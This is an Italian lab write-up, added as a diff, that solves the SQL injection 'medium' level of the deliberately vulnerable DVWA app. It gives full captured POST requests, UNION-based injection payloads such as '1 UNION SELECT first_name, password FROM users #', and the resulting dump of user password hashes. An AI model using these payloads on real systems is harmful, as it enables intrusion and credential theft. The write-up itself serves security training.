@@ -1,0 +1,114 @@
+#+TITLE: DVWA - SQLi Medium
+#+AUTHOR: Leonardo Tamiano
+
+* Log
+   [2022-07-23 Sat 18:10]
+
+   La richiesta HTTP effettuata è la seguente
+   
+   #+begin_example
+POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
+Host: evil.com
+Content-Length: 18
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://evil.com/dvwa/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: security=medium; PHPSESSID=cha7rsj468ggoua24i1pp32k81
+Connection: close
+
+id=1&Submit=Submit   
+   #+end_example
+
+   Anche se il codice html prova a rinforzare il controllo sul valore
+   dell'ID, facendo in modo che L'ID possa essere solamente un valore
+   tra 1 e 5.
+   
+   #+begin_src html
+<form action="#" method="POST">
+  <p>
+    User ID:
+    <select name="id">
+      <option value="1">1</option>
+      <option value="2">2</option>
+      <option value="3">3</option>
+      <option value="4">4</option>
+      <option value="5">5</option>
+    </select>
+    <input type="submit" name="Submit" value="Submit">
+  </p>
+  
+</form>   
+   #+end_src
+
+   Andando a manipolare direttamente la richiesta POST e cambiando il
+   valore di ~id~ in un valore a nostra scelta, bypassiamo ogni
+   controllo. Se mettiamo il payload
+
+   #+begin_example
+   id=1+1&Submit=Submit
+   #+end_example
+
+   otteniamo il seguente errore SQL
+
+   #+begin_example
+<pre>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1' at line 1</pre>   
+   #+end_example
+
+   La presenza di questo errore è un possibile sintomo del fatto che
+   l'input dell'utente è utilizzato direttamente e senza sanificazioni
+   per costruire la query che viene poi eseguita sul database. Queste
+   potrebbe portare ad una SQL injection.
+
+   --------
+
+   Il payload di interesse per ottenere una sqli è quindi il seguente
+   
+   #+begin_example
+   1 OR 1=1 #
+   #+end_example
+   
+   se poi siamo interessati a tutte le password, possiamo utilizzare
+   quest'altro payload
+   
+   #+begin_example
+   1 UNION SELECT first_name, password FROM users #
+   #+end_example
+
+   Che ci ritorna la seguente risposta
+
+   #+begin_src html
+<pre>ID: 1 UNION SELECT first_name, password FROM users # <br />First name: admin <br />Surname: admin</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: Gordon<br />Surname: e99a18c428cb38d5f260853678922e03</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: Hack<br />Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: Pablo<br />Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: Bob<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
+   #+end_src
+   
+      --------
+      
+      #+begin_example
+POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
+Host: evil.com
+Content-Length: 65
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://evil.com/dvwa/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: security=medium; PHPSESSID=cha7rsj468ggoua24i1pp32k81
+Connection: close
+
+id=1 UNION SELECT first_name, password FROM users #&Submit=Submit      
+      #+end_example
+  
